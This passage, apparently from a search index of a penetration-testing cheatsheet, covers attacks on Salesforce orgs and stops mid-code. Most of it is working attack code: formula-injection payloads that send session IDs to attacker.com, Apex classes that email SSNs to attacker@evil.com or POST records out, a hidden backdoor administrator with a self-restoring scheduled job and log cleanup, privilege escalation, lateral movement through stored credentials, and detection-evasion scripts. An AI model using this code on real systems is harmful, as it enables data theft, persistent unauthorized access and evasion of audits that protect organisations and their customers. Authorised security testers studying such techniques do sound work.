headers=headers\n        )\n\n        if response.status_code == 201:\n            root = ET.fromstring(response.content)\n            batch_id = root.find('.//{http://www.force.com/2009/06/async/dataloader}id').text\n            return batch_id\n        else:\n            print(f\"Batch creation failed: {response.status_code}\")\n            return None\n\n    def test_bulk_extraction(self, sobject_type, sensitive_fields):\n        \"\"\"Test bulk data extraction\"\"\"\n        job_id = self.create_bulk_job(sobject_type)\n        if not job_id:\n            return False\n\n        query = f\"SELECT Id, {', '.join(sensitive_fields)} FROM {sobject_type}\"\n        batch_id = self.add_batch(job_id, query)\n\n        if not batch_id:\n            return False\n\n        print(f\"Bulk extraction job created: {job_id}, batch: {batch_id}\")\n        return True\n\n# Usage\ntester = BulkAPITester(session_id, instance_url)\nsensitive_fields = ['Name', 'Email', 'Phone', 'SSN__c']\ntester.test_bulk_extraction('Contact', sensitive_fields)\n</code></pre></p> <p>Impact: Bulk data exfiltration capability assessment.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#3-soap-api-security-testing","title":"3. SOAP API Security Testing","text":"<p>Objective: Assess SOAP API security including XML injection and session handling.</p> <p>SOAP Session Testing: <pre><code>&lt;!-- Test session hijacking via SOAP --&gt;\n&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" \n                  xmlns:urn=\"urn:enterprise.soap.sforce.com\"&gt;\n    &lt;soapenv:Header&gt;\n        &lt;urn:SessionHeader&gt;\n            &lt;urn:sessionId&gt;CAPTURED_SESSION_ID&lt;/urn:sessionId&gt;\n        &lt;/urn:SessionHeader&gt;\n    &lt;/soapenv:Header&gt;\n    &lt;soapenv:Body&gt;\n        &lt;urn:query&gt;\n            &lt;urn:queryString&gt;SELECT Id, Name FROM Account LIMIT 5&lt;/urn:queryString&gt;\n        &lt;/urn:query&gt;\n    &lt;/soapenv:Body&gt;\n&lt;/soapenv:Envelope&gt;\n</code></pre></p> <p>XML Injection Testing: <pre><code>&lt;!-- SOAP SOQL injection test --&gt;\n&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" \n                  xmlns:urn=\"urn:enterprise.soap.sforce.com\"&gt;\n    &lt;soapenv:Header&gt;\n        &lt;urn:SessionHeader&gt;\n            &lt;urn:sessionId&gt;SESSION_ID&lt;/urn:sessionId&gt;\n        &lt;/urn:SessionHeader&gt;\n    &lt;/soapenv:Header&gt;\n    &lt;soapenv:Body&gt;\n        &lt;urn:query&gt;\n            &lt;urn:queryString&gt;SELECT Id FROM Account WHERE Name = 'test' UNION SELECT Password__c FROM User--&lt;/urn:queryString&gt;\n        &lt;/urn:query&gt;\n    &lt;/soapenv:Body&gt;\n&lt;/soapenv:Envelope&gt;\n</code></pre></p> <p>Impact: Session hijacking, injection attacks, unauthorized data access.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#integration-security-assessment","title":"Integration Security Assessment","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#1-connected-apps-security-review","title":"1. Connected Apps Security Review","text":"<p>Objective: Assess OAuth implementations and connected application security.</p> <p>Connected Apps Analysis: <pre><code>-- Comprehensive connected apps analysis\nSELECT Id, Name, ContactEmail, CallbackUrl, ConsumerKey, \n       CreatedDate, CreatedBy.Name, Description, MobileSessionTimeout,\n       RefreshTokenValidityPeriod, UsersCanSelfAuthorize,\n       OptionsFullScopeApprovals\nFROM ConnectedApplication \nORDER BY CreatedDate DESC\n\n-- OAuth flow analysis\nSELECT Id, App.Name, UserId, User.Username, User.Email, \n       IssuedDate, ExpirationDate, UseCount, LastUsedDate,\n       Scopes, RedirectUri\nFROM OAuth2Authorization \nORDER BY LastUsedDate DESC NULLS LAST\n\n-- Refresh token analysis\nSELECT Id, AppName, User.Username, User.Email, UseCount,\n       LastUsedDate, IssuedDate, ExpirationDate\nFROM OAuth2PeriodicRefreshToken \nORDER BY LastUsedDate DESC\n</code></pre></p> <p>OAuth Security Testing: <pre><code>def test_oauth_flow(client_id, redirect_uri, authorization_endpoint):\n    \"\"\"Test OAuth authorization code flow security\"\"\"\n    # Standard authorization request\n    auth_url = f\"{authorization_endpoint}?\" \\\n               f\"client_id={client_id}&amp;\" \\\n               f\"redirect_uri={redirect_uri}&amp;\" \\\n               f\"response_type=code&amp;\" \\\n               f\"scope=full\"\n\n    print(f\"Authorization URL: {auth_url}\")\n\n    # Test redirect URI manipulation\n    malicious_redirect = \"https://attacker.com/callback\"\n    malicious_url = f\"{authorization_endpoint}?\" \\\n                   f\"client_id={client_id}&amp;\" \\\n                   f\"redirect_uri={malicious_redirect}&amp;\" \\\n                   f\"response_type=code&amp;\" \\\n                   f\"scope=full\"\n\n    print(f\"Malicious redirect test: {malicious_url}\")\n\n    # Test state parameter absence (CSRF protection)\n    no_state_url = f\"{authorization_endpoint}?\" \\\n                  f\"client_id={client_id}&amp;\" \\\n                  f\"redirect_uri={redirect_uri}&amp;\" \\\n                  f\"response_type=code&amp;\" \\\n                  f\"scope=full\"\n\n    print(f\"No state parameter: {no_state_url}\")\n\n# Token validation testing\ndef test_token_security(access_token, refresh_token, client_id):\n    \"\"\"Test OAuth token security\"\"\"\n    # Test token with different scopes\n    response = requests.get(\n        \"https://instance.salesforce.com/services/data/v52.0/sobjects/User/\",\n        headers={\"Authorization\": f\"Bearer {access_token}\"}\n    )\n\n    # Test refresh token reuse\n    refresh_response = requests.post(\n        \"https://instance.salesforce.com/services/oauth2/token\",\n        data={\n            \"grant_type\": \"refresh_token\",\n            \"refresh_token\": refresh_token,\n            \"client_id\": client_id\n        }\n    )\n</code></pre></p> <p>Impact: OAuth hijacking, unauthorized app access, token abuse.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#2-named-credentials-security-assessment","title":"2. Named Credentials Security Assessment","text":"<p>Objective: Evaluate external service integration security and credential management.</p> <p>Named Credentials Analysis: <pre><code>-- Named credentials configuration\nSELECT Id, DeveloperName, Endpoint, PrincipalType, Protocol,\n       AuthTokenEndpointUrl, JwtAudience, JwtIssuer,\n       Username\nFROM NamedCredential\n\n-- External services using named credentials\nSELECT Id, DeveloperName, ExternalServiceProviderId, \n       Description, Status\nFROM ExternalServiceRegistration\n</code></pre></p> <p>External Service Security Testing: <pre><code>// Test named credential security\npublic class NamedCredentialTester {\n    public static void testExternalCall(String namedCredential) {\n        HttpRequest req = new HttpRequest();\n        req.setEndpoint('callout:' + namedCredential + '/api/sensitive-data');\n        req.setMethod('GET');\n\n        Http http = new Http();\n        try {\n            HttpResponse res = http.send(req);\n            System.debug('Response: ' + res.getStatusCode());\n            System.debug('Body: ' + res.getBody());\n        } catch (Exception e) {\n            System.debug('Error: ' + e.getMessage());\n        }\n    }\n}\n</code></pre></p> <p>Certificate Validation Testing: <pre><code>def test_certificate_validation(endpoint):\n    \"\"\"Test SSL certificate validation\"\"\"\n    import urllib3\n    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\n    try:\n        # Test with invalid certificate\n        response = requests.get(endpoint, verify=False, timeout=10)\n        print(f\"Insecure connection accepted: {response.status_code}\")\n    except Exception as e:\n        print(f\"Insecure connection rejected: {e}\")\n\n    try:\n        # Test with proper certificate validation\n        response = requests.get(endpoint, verify=True, timeout=10)\n        print(f\"Secure connection successful: {response.status_code}\")\n    except Exception as e:\n        print(f\"Certificate validation failed: {e}\")\n</code></pre></p> <p>Impact: Man-in-the-middle attacks, credential compromise, external service abuse.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#advanced-attack-vectors","title":"Advanced Attack Vectors","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#1-formula-injection-attacks","title":"1. Formula Injection Attacks","text":"<p>Objective: Identify and exploit formula injection vulnerabilities in calculated fields and validation rules.</p> <p>Formula Field Discovery: <pre><code>-- Formula fields with potential injection risks\nSELECT Id, QualifiedApiName, Label, FormulaSourceText,\n       EntityDefinition.QualifiedApiName as ObjectName\nFROM FieldDefinition \nWHERE DataType IN ('Text', 'Url') \n  AND FormulaSourceText != null \n  AND (FormulaSourceText LIKE '%HYPERLINK%' OR FormulaSourceText LIKE '%IMAGE%')\n\n-- Validation rules with formulas\nSELECT Id, ValidationName, ErrorConditionFormula, ErrorMessage,\n       EntityDefinition.QualifiedApiName as ObjectName, IsActive\nFROM ValidationRule \nWHERE IsActive = true \n  AND (ErrorConditionFormula LIKE '%HYPERLINK%' OR ErrorConditionFormula LIKE '%TEXT%')\n</code></pre></p> <p>Formula Injection Payloads: <pre><code>// Information disclosure\nHYPERLINK(\"http://attacker.com/exfil?session=\" &amp; $Api.Session_ID, \"Click Here\")\n\n// User context information\nHYPERLINK(\"http://attacker.com/exfil?user=\" &amp; $User.Id &amp; \"&amp;org=\" &amp; $Organization.Id, \"Link\")\n\n// Cross-site scripting via formulas\nHYPERLINK(\"javascript:alert('XSS via Formula')\", \"Click for XSS\")\n\n// Advanced payload with data exfiltration\nHYPERLINK(\"javascript:void((function(){var s=document.createElement('script');s.src='//attacker.com/steal.js';document.head.appendChild(s);})())\", \"Malicious Link\")\n\n// File system access (if enabled)\nHYPERLINK(\"file:///etc/passwd\", \"System Files\")\nHYPERLINK(\"\\\\\\\\attacker.com\\\\share\\\\malicious.exe\", \"Network Resource\")\n</code></pre></p> <p>Automated Formula Injection Testing: <pre><code>public class FormulaInjectionTester {\n    public static void testFormulaInjection(String objectName, String fieldName) {\n        Schema.SObjectType objectType = Schema.getGlobalDescribe().get(objectName);\n        SObject testRecord = objectType.newSObject();\n\n        List&lt;String&gt; payloads = new List&lt;String&gt;{\n            '&lt;script&gt;alert(\"XSS\")&lt;/script&gt;',\n            'javascript:alert(\"XSS\")',\n            '\"&gt;&lt;script&gt;alert(\"XSS\")&lt;/script&gt;',\n            '\\';alert(\"XSS\");var a=\\'',\n            'http://attacker.com/steal?data='\n        };\n\n        for (String payload : payloads) {\n            try {\n                testRecord.put(fieldName, payload);\n                insert testRecord;\n\n                String query = 'SELECT Id, ' + fieldName + ' FROM ' + objectName + \n                              ' WHERE Id = \\'' + testRecord.Id + '\\'';\n                List&lt;SObject&gt; results = Database.query(query);\n\n                if (!results.isEmpty()) {\n                    String resultValue = String.valueOf(results[0].get(fieldName));\n                    if (resultValue.contains('javascript:') || resultValue.contains('&lt;script&gt;')) {\n                        System.debug('Potential formula injection: ' + payload);\n                    }\n                }\n\n                delete testRecord;\n            } catch (Exception e) {\n                System.debug('Payload blocked: ' + payload + ' - ' + e.getMessage());\n            }\n        }\n    }\n}\n</code></pre></p> <p>Impact: Information disclosure, client-side code execution, data exfiltration.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#2-process-automation-exploitation","title":"2. Process Automation Exploitation","text":"<p>Objective: Identify security vulnerabilities in Process Builder, Flow, and Workflow automation.</p> <p>Process &amp; Flow Discovery: <pre><code>-- Active processes and flows\nSELECT Id, DeveloperName, ProcessType, Status, Description,\n       LastModifiedDate, LastModifiedBy.Name, TriggerType\nFROM Flow \nWHERE Status = 'Active' \n  AND ProcessType IN ('Flow', 'Workflow', 'AutoLaunchedFlow')\n\n-- Process builder definitions\nSELECT Id, Name, Type, State, Description, TableEnumOrId,\n       CreatedDate, LastModifiedDate, LastModifiedBy.Name\nFROM ProcessDefinition \nWHERE State = 'Active'\n\n-- Flow interviews (execution instances)\nSELECT Id, Name, CurrentElement, FlowVersionView.ProcessType,\n       StartTime, PauseTime, CreatedDate, CreatedBy.Name\nFROM FlowInterview \nWHERE CreatedDate = TODAY \nORDER BY StartTime DESC\n</code></pre></p> <p>Process Automation Security Testing: <pre><code>// Test flow input validation\npublic class FlowSecurityTester {\n    public static void testFlowInputValidation(String flowApiName) {\n        Map&lt;String, Object&gt; inputVariables = new Map&lt;String, Object&gt;();\n\n        // Injection payloads for flow inputs\n        inputVariables.put('textInput', '&lt;script&gt;alert(\"XSS\")&lt;/script&gt;');\n        inputVariables.put('emailInput', 'test@example.com; DELETE FROM Account;');\n        inputVariables.put('numberInput', '1; DROP TABLE User;');\n\n        try {\n            Flow.Interview flowInterview = Flow.Interview.createInterview(flowApiName, inputVariables);\n            flowInterview.start();\n            System.debug('Flow executed with malicious input');\n        } catch (Exception e) {\n            System.debug('Flow execution blocked: ' + e.getMessage());\n        }\n    }\n}\n\n// Test for privilege escalation in system context\npublic class PrivilegeEscalationTest {\n    public static void testSystemContextAbuse() {\n        Profile standardProfile = [SELECT Id FROM Profile WHERE Name = 'Standard User' LIMIT 1];\n        User testUser = new User(\n            Username = 'lowpriv@test.com',\n            Email = 'lowpriv@test.com',\n            LastName = 'LowPriv',\n            Alias = 'lowpriv',\n            ProfileId = standardProfile.Id,\n            TimeZoneSidKey = 'America/New_York',\n            LocaleSidKey = 'en_US',\n            EmailEncodingKey = 'UTF-8',\n            LanguageLocaleKey = 'en_US'\n        );\n        insert testUser;\n\n        System.runAs(testUser) {\n            Account testAccount = new Account(Name = 'Privilege Escalation Test');\n            insert testAccount;\n\n            try {\n                List&lt;User&gt; adminUsers = [SELECT Id FROM User WHERE Profile.Name = 'System Administrator'];\n                if (!adminUsers.isEmpty()) {\n                    System.debug('Unauthorized access to admin users via process');\n                }\n            } catch (Exception e) {\n                System.debug('Process properly enforced security: ' + e.getMessage());\n            }\n        }\n    }\n}\n</code></pre></p> <p>Impact: Automated privilege escalation, system abuse, data manipulation.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#3-metadata-api-security-exploitation","title":"3. Metadata API Security Exploitation","text":"<p>Objective: Test metadata manipulation capabilities for security control bypass.</p> <p>Metadata API Access Testing: <pre><code>&lt;!-- Test metadata retrieval --&gt;\n&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" \n                  xmlns:met=\"http://soap.sforce.com/2006/04/metadata\"&gt;\n    &lt;soapenv:Header&gt;\n        &lt;met:SessionHeader&gt;\n            &lt;met:sessionId&gt;SESSION_ID&lt;/met:sessionId&gt;\n        &lt;/met:SessionHeader&gt;\n    &lt;/soapenv:Header&gt;\n    &lt;soapenv:Body&gt;\n        &lt;met:listMetadata&gt;\n            &lt;met:queries&gt;\n                &lt;met:type&gt;Profile&lt;/met:type&gt;\n            &lt;/met:queries&gt;\n            &lt;met:asOfVersion&gt;52.0&lt;/met:asOfVersion&gt;\n        &lt;/met:listMetadata&gt;\n    &lt;/soapenv:Body&gt;\n&lt;/soapenv:Envelope&gt;\n</code></pre></p> <p>Security Control Bypass Attempts: <pre><code>&lt;!-- Attempt to modify profile permissions --&gt;\n&lt;Profile xmlns=\"http://soap.sforce.com/2006/04/metadata\"&gt;\n    &lt;fullName&gt;Standard User&lt;/fullName&gt;\n    &lt;userPermissions&gt;\n        &lt;enabled&gt;true&lt;/enabled&gt;\n        &lt;name&gt;ModifyAllData&lt;/name&gt;\n    &lt;/userPermissions&gt;\n    &lt;userPermissions&gt;\n        &lt;enabled&gt;true&lt;/enabled&gt;\n        &lt;name&gt;ViewAllData&lt;/name&gt;\n    &lt;/userPermissions&gt;\n&lt;/Profile&gt;\n\n&lt;!-- Disable security validation rules --&gt;\n&lt;ValidationRule xmlns=\"http://soap.sforce.com/2006/04/metadata\"&gt;\n    &lt;fullName&gt;Security_Validation_Rule&lt;/fullName&gt;\n    &lt;active&gt;false&lt;/active&gt;\n    &lt;errorConditionFormula&gt;false&lt;/errorConditionFormula&gt;\n    &lt;errorMessage&gt;Bypassed security validation&lt;/errorMessage&gt;\n&lt;/ValidationRule&gt;\n</code></pre></p> <p>Metadata Deployment Testing: <pre><code>def test_metadata_deployment(session_id, instance_url, metadata_xml):\n    \"\"\"Test metadata deployment capabilities\"\"\"\n    import base64\n\n    encoded_metadata = base64.b64encode(metadata_xml.encode()).decode()\n\n    deployment_xml = f\"\"\"&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n    &lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" \n                      xmlns:met=\"http://soap.sforce.com/2006/04/metadata\"&gt;\n        &lt;soapenv:Header&gt;\n            &lt;met:SessionHeader&gt;\n                &lt;met:sessionId&gt;{session_id}&lt;/met:sessionId&gt;\n            &lt;/met:SessionHeader&gt;\n        &lt;/soapenv:Header&gt;\n        &lt;soapenv:Body&gt;\n            &lt;met:deploy&gt;\n                &lt;met:ZipFile&gt;{encoded_metadata}&lt;/met:ZipFile&gt;\n                &lt;met:DeployOptions&gt;\n                    &lt;met:allowMissingFiles&gt;false&lt;/met:allowMissingFiles&gt;\n                    &lt;met:autoUpdatePackage&gt;false&lt;/met:autoUpdatePackage&gt;\n                    &lt;met:checkOnly&gt;true&lt;/met:checkOnly&gt;\n                    &lt;met:ignoreWarnings&gt;false&lt;/met:ignoreWarnings&gt;\n                    &lt;met:performRetrieve&gt;false&lt;/met:performRetrieve&gt;\n                    &lt;met:rollbackOnError&gt;true&lt;/met:rollbackOnError&gt;\n                    &lt;met:singlePackage&gt;true&lt;/met:singlePackage&gt;\n                &lt;/met:DeployOptions&gt;\n            &lt;/met:deploy&gt;\n        &lt;/soapenv:Body&gt;\n    &lt;/soapenv:Envelope&gt;\"\"\"\n\n    headers = {\n        'Content-Type': 'text/xml; charset=UTF-8',\n        'SOAPAction': 'deploy'\n    }\n\n    response = requests.post(\n        f\"{instance_url}/services/Soap/m/52.0\",\n        data=deployment_xml,\n        headers=headers\n    )\n\n    if response.status_code == 200:\n        print(\"Metadata deployment test completed\")\n        return response.text\n    else:\n        print(f\"Metadata deployment failed: {response.status_code}\")\n        return None\n</code></pre></p> <p>Impact: Security control bypass, unauthorized configuration changes.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#post-exploitation-persistence","title":"Post-Exploitation &amp; Persistence","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#1-data-exfiltration-techniques","title":"1. Data Exfiltration Techniques","text":"<p>Objective: Methods for extracting data after gaining unauthorized access.</p> <p>Bulk Data Extraction: <pre><code>-- Comprehensive data extraction queries\nSELECT Id, Name, Email, Phone, SSN__c, Credit_Card__c \nFROM Contact \nLIMIT 50000\n\n-- Incremental extraction to avoid detection\nSELECT Id, Name, AnnualRevenue, LastModifiedDate \nFROM Account \nWHERE LastModifiedDate &gt; 2023-01-01T00:00:00Z\n\n-- Relationship traversal for connected data\nSELECT Id, Name, (SELECT Id, Email, Phone FROM Contacts) \nFROM Account\n\n-- Financial data extraction\nSELECT Id, Name, Amount, CloseDate, StageName,\n       (SELECT Id, Name FROM Account) \nFROM Opportunity \nWHERE Amount &gt; 100000\n</code></pre></p> <p>Stealth Extraction Methods: <pre><code>def stealth_data_extraction(session_id, instance_url):\n    \"\"\"Extract data using small, frequent queries to avoid detection\"\"\"\n    import time\n    import random\n\n    headers = {'Authorization': f'Bearer {session_id}'}\n    extracted_data = []\n\n    # Small batch sizes with random delays\n    batch_size = 50\n    delay_range = (5, 15)  # 5-15 seconds between requests\n\n    offset = 0\n    while True:\n        query = f\"SELECT Id, Name, Email FROM Contact LIMIT {batch_size} OFFSET {offset}\"\n\n        response = requests.get(\n            f\"{instance_url}/services/data/v52.0/query\",\n            headers=headers,\n            params={'q': query}\n        )\n\n        if response.status_code == 200:\n            data = response.json()\n            if not data['records']:\n                break\n\n            extracted_data.extend(data['records'])\n            offset += batch_size\n\n            # Random delay to avoid detection\n            time.sleep(random.uniform(*delay_range))\n        else:\n            break\n\n    return extracted_data\n</code></pre></p> <p>Alternative Exfiltration Channels: <pre><code>// Email-based exfiltration\npublic class EmailExfiltration {\n    public static void exfiltrateViaEmail() {\n        List&lt;Contact&gt; sensitiveContacts = [SELECT Id, Name, Email, SSN__c FROM Contact LIMIT 100];\n\n        String csvData = 'Name,Email,SSN\\n';\n        for (Contact c : sensitiveContacts) {\n            csvData += c.Name + ',' + c.Email + ',' + c.SSN__c + '\\n';\n        }\n\n        Messaging.SingleEmailMessage email = new Messaging.SingleEmailMessage();\n        email.setToAddresses(new String[]{'attacker@evil.com'});\n        email.setSubject('Data Export');\n        email.setPlainTextBody(csvData);\n\n        Messaging.sendEmail(new Messaging.SingleEmailMessage[]{email});\n    }\n}\n\n// HTTP callout exfiltration\npublic class HttpExfiltration {\n    @future(callout=true)\n    public static void exfiltrateViaHttp() {\n        List&lt;Account&gt; accounts = [SELECT Id, Name, AnnualRevenue FROM Account LIMIT 100];\n\n        String jsonData = JSON.serialize(accounts);\n\n        HttpRequest req = new HttpRequest();\n        req.setEndpoint('https://attacker.com/collect');\n        req.setMethod('POST');\n        req.setBody(jsonData);\n\n        Http http = new Http();\n        HttpResponse res = http.send(req);\n    }\n}\n</code></pre></p> <p>Impact: Intellectual property theft, compliance violations, competitive advantage loss.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#2-persistence-mechanisms","title":"2. Persistence Mechanisms","text":"<p>Objective: Techniques for maintaining access to compromised systems.</p> <p>Backdoor User Creation: <pre><code>public class PersistenceManager {\n    public static void createBackdoorUser() {\n        // Create hidden administrative user\n        Profile adminProfile = [SELECT Id FROM Profile WHERE Name = 'System Administrator' LIMIT 1];\n\n        User backdoorUser = new User(\n            Username = 'maintenance@company-domain.com',\n            Email = 'maintenance@company-domain.com',\n            FirstName = 'System',\n            LastName = 'Maintenance',\n            Alias = 'sysmaint',\n            ProfileId = adminProfile.Id,\n            TimeZoneSidKey = 'America/New_York',\n            LocaleSidKey = 'en_US',\n            EmailEncodingKey = 'UTF-8',\n            LanguageLocaleKey = 'en_US',\n            IsActive = true\n        );\n\n        insert backdoorUser;\n\n        // Assign additional permissions\n        PermissionSet adminPermSet = [SELECT Id FROM PermissionSet WHERE Name = 'Custom_Admin_Access' LIMIT 1];\n        PermissionSetAssignment psa = new PermissionSetAssignment(\n            PermissionSetId = adminPermSet.Id,\n            AssigneeId = backdoorUser.Id\n        );\n        insert psa;\n    }\n}\n</code></pre></p> <p>Connected App Persistence: <pre><code>&lt;!-- Register persistent OAuth application --&gt;\n&lt;ConnectedApplication xmlns=\"http://soap.sforce.com/2006/04/metadata\"&gt;\n    &lt;fullName&gt;MaintenanceApp&lt;/fullName&gt;\n    &lt;label&gt;System Maintenance Tool&lt;/label&gt;\n    &lt;contactEmail&gt;maintenance@company.com&lt;/contactEmail&gt;\n    &lt;description&gt;Internal system maintenance application&lt;/description&gt;\n    &lt;oauthConfig&gt;\n        &lt;callbackUrl&gt;https://maintenance.company.com/callback&lt;/callbackUrl&gt;\n        &lt;scopes&gt;Full&lt;/scopes&gt;\n        &lt;consumerKey&gt;HIDDEN_CONSUMER_KEY&lt;/consumerKey&gt;\n        &lt;consumerSecret&gt;HIDDEN_CONSUMER_SECRET&lt;/consumerSecret&gt;\n    &lt;/oauthConfig&gt;\n&lt;/ConnectedApplication&gt;\n</code></pre></p> <p>Scheduled Job Implantation: <pre><code>// Apex scheduled job for persistence\nglobal class BackdoorMaintenanceJob implements Schedulable {\n    global void execute(SchedulableContext sc) {\n        // Maintain backdoor access\n        maintainBackdoorUser();\n\n        // Periodic data collection\n        collectSensitiveData();\n\n        // Clean up traces\n        cleanAuditLogs();\n    }\n\n    private void maintainBackdoorUser() {\n        List&lt;User&gt; backdoorUsers = [SELECT Id FROM User WHERE Username = 'maintenance@company-domain.com'];\n        if (backdoorUsers.isEmpty()) {\n            // Recreate backdoor if detected and removed\n            PersistenceManager.createBackdoorUser();\n        }\n    }\n\n    private void collectSensitiveData() {\n        // Periodic data collection logic\n        List&lt;Account&gt; newAccounts = [SELECT Id, Name, AnnualRevenue FROM Account WHERE CreatedDate = LAST_N_DAYS:1];\n        if (!newAccounts.isEmpty()) {\n            // Exfiltrate new data\n            HttpExfiltration.exfiltrateViaHttp();\n        }\n    }\n\n    private void cleanAuditLogs() {\n        // Attempt to clean audit trail evidence\n        try {\n            List&lt;SetupAuditTrail&gt; auditEntries = [SELECT Id FROM SetupAuditTrail WHERE CreatedBy.Username = 'maintenance@company-domain.com'];\n            // Note: SetupAuditTrail records cannot be deleted, but this shows intent\n        } catch (Exception e) {\n            // Audit cleaning failed\n        }\n    }\n}\n\n// Schedule the job to run daily\nSystem.schedule('Maintenance Job', '0 0 2 * * ?', new BackdoorMaintenanceJob());\n</code></pre></p> <p>Impact: Long-term unauthorized access, continued data compromise, persistent threat presence.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#3-lateral-movement","title":"3. Lateral Movement","text":"<p>Objective: Techniques for expanding access within the Salesforce ecosystem.</p> <p>Permission Set Assignment for Privilege Escalation: <pre><code>public class LateralMovement {\n    public static void escalatePrivileges(Id targetUserId) {\n        // Find high-privilege permission sets\n        List&lt;PermissionSet&gt; adminPermSets = [\n            SELECT Id, Name \n            FROM PermissionSet \n            WHERE PermissionsModifyAllData = true \n               OR PermissionsViewAllData = true\n        ];\n\n        for (PermissionSet ps : adminPermSets) {\n            try {\n                PermissionSetAssignment psa = new PermissionSetAssignment(\n                    PermissionSetId = ps.Id,\n                    AssigneeId = targetUserId\n                );\n                insert psa;\n                System.debug('Assigned permission set: ' + ps.Name);\n            } catch (Exception e) {\n                System.debug('Failed to assign: ' + ps.Name + ' - ' + e.getMessage());\n            }\n        }\n    }\n}\n</code></pre></p> <p>Sharing Rule Manipulation: <pre><code>public class SharingManipulation {\n    public static void createMaliciousSharing() {\n        // Create overly permissive account sharing rule\n        AccountSharingRule rule = new AccountSharingRule(\n            Name = 'Emergency Access Rule',\n            AccountAccessLevel = 'Edit',\n            CaseAccessLevel = 'Edit',\n            ContactAccessLevel = 'Edit',\n            OpportunityAccessLevel = 'Edit',\n            SharedToType = 'Role',\n            SharedToId = 'ROLE_ID'  // Target role ID\n        );\n\n        try {\n            insert rule;\n            System.debug('Malicious sharing rule created');\n        } catch (Exception e) {\n            System.debug('Sharing rule creation failed: ' + e.getMessage());\n        }\n    }\n}\n</code></pre></p> <p>Cross-System Integration Exploitation: <pre><code>public class IntegrationExploit {\n    @future(callout=true)\n    public static void exploitConnectedSystems() {\n        // Harvest credentials from named credentials\n        List&lt;NamedCredential&gt; credentials = [SELECT DeveloperName, Endpoint FROM NamedCredential];\n\n        for (NamedCredential cred : credentials) {\n            try {\n                HttpRequest req = new HttpRequest();\n                req.setEndpoint('callout:' + cred.DeveloperName + '/api/admin/users');\n                req.setMethod('GET');\n\n                Http http = new Http();\n                HttpResponse res = http.send(req);\n\n                if (res.getStatusCode() == 200) {\n                    // Successfully accessed connected system\n                    System.debug('Connected system accessed: ' + cred.DeveloperName);\n\n                    // Attempt to extract data or escalate privileges in connected system\n                    String responseBody = res.getBody();\n                    // Process response for additional exploitation\n                }\n            } catch (Exception e) {\n                System.debug('Connection failed: ' + cred.DeveloperName);\n            }\n        }\n    }\n}\n</code></pre></p> <p>Impact: Expanded unauthorized access, multi-system compromise, network lateral movement.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#detection-evasion","title":"Detection Evasion","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#1-audit-trail-manipulation","title":"1. Audit Trail Manipulation","text":"<p>Objective: Techniques for avoiding detection in security logs and audit trails.</p> <p>Login History Evasion: <pre><code>def evasive_login_patterns(username, password):\n    \"\"\"Use varied login patterns to avoid detection\"\"\"\n    import random\n    import time\n\n    # Vary user agents\n    user_agents = [\n        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',\n        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',\n        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'\n    ]\n\n    # Vary source IPs (if possible)\n    proxy_ips = ['192.168.1.10', '10.0.0.5', '172.16.0.20']\n\n    for i in range(5):\n        headers = {\n            'User-Agent': random.choice(user_agents),\n            'X-Forwarded-For': random.choice(proxy_ips)\n        }\n\n        # Perform login with variation\n        login_data = {'username': username, 'pw': password}\n        response = requests.post(\n            'https://instance.salesforce.com/login.jsp',\n            data=login_data,\n            headers=headers\n        )\n\n        # Random delay between attempts\n        time.sleep(random.uniform(30, 300))  # 30 seconds to 5 minutes\n</code></pre></p> <p>Setup Audit Trail Evasion: <pre><code>public class AuditEvasion {\n    public static void performStealthyActions() {\n        // Use anonymous blocks to reduce attribution\n        Database.executeBatch(new StealthyBatch(), 1);\n    }\n\n    // Batch job to distribute actions across time\n    public class StealthyBatch implements Database.Batchable&lt;SObject&gt; {\n        public Database.QueryLocator start(Database.BatchableContext bc) {\n            return Database.getQueryLocator('SELECT Id FROM Account LIMIT 1');\n        }\n\n        public void execute(Database.BatchableContext bc, List&lt;Account&gt; records) {\n            // Perform malicious actions in small batches\n            List&lt;User&gt; users = [SELECT Id, IsActive FROM User WHERE Profile.Name != 'System Administrator' LIMIT 5];\n\n            for (User u : users) {\n                // Make subtle privilege changes\n                try {\n                    // Assign temporary permission set\n                    PermissionSetAssignment psa = new 